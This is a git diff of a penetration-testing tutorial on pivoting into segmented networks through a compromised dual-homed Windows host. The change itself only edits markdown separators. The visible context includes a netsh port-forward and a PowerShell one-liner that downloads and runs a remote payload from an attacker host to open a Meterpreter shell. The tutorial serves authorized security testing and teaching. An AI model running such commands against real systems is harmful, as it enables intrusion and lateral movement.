@@ -1,6 +1,6 @@
 ## Reverse SSH Tunnel Method
 As a penetration tester, you are expected to know how to pivot between hosts even when they reside on segmented networks. Segmented hosts are typically in-scope and often engagement target(s). The following example examines one method to accomplish segmented network pivoting via a dual-homed server compromised by the attacker without writing any third-party tools to disk.
-
+***
 ### Simplified Segmented Network
 ![Segmented Network Example](segmented-network-live-off-the-land-example.png)
 
@@ -30,7 +30,7 @@ Additional Route Details:
 2. The attacker has escalated their privileges to Administrator, SYSTEM, or equivalent
 3. Interaction via RDP, WinRM, webshell, xp_cmdshell, etc., with Target Internal Client is already direct possible via session (RDP or otherwise) on Dual-Homed Compromised Host.
 4. The unaltered MSFVenom payload is sufficient to bypass defenses such as AMSI and Defender. During real engagements default payloads like this should not be used. For the purposes of simplifying this example, we assume the payload will execute properly.
-
+---
 ### Step-By-Step Instructions For Pivot
 1. (Kali) Make payload and place in apache default webroot
 ```zsh
@@ -65,9 +65,8 @@ netsh interface portproxy add v4tov4 listenport=8669 listenaddress=10.10.1.200 c
 powershell -ep bypass -c "(New-Object System.Net.WebClient).DownloadString('http://10.10.1.200:4422/win-x64-8669.txt') | IEX"
 ```
 9. Receive remote shell in MSFConsole
-
-
-
+***
+***
 ### Additional Pivoting Option via Reverse SSH Tunnel
 In some cases, you will want to have a socket opened on the Compromised Dual-Homed Host for your tools, such as CrackMapExec, Evil-WinRM, SQLMap, etc., to tunnel through. Doing so allows your local tools to work with proxychains to reach and target otherwise unreachable hosts on segmented networks. To make this socket, we can use the SSH client on the compromised host SSH into our Kali machine and open a socket locally (on Kali) that we can pivot through.
 
